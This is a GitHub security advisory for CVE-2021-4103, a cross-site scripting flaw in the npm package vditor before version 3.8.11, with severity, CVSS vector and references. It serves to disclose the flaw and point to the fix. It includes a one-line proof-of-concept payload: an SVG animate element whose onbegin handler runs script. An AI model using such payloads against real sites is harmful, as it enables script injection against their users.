# [M] vditor Vulnerable to Cross-site Scripting in SVG events

## Summary
Severity: Medium
Advisory: GHSA-cxm3-v4mv-6mh8
CVE: CVE-2021-4103
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2022-01-28
Source: https://github.com/advisories/GHSA-cxm3-v4mv-6mh8
Type: github-advisory

## Affected
- npm: `vditor` — affected >=0 <3.8.11

## Details
vditor does not filter user input in SVG events, leading to XSS 

### PoC

```html
</a>
<svg><animate onbegin=alert(11) attributeName=x dur=1s>
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-4103
- https://github.com/Vanessa219/vditor/issues/1133
- https://github.com/vanessa219/vditor/commit/8d4d0889dd72b2f839e93a49db3da3a370416c7d
- https://github.com/vanessa219/vditor
- https://huntr.dev/bounties/67b980af-7357-4879-9448-a926c6474225
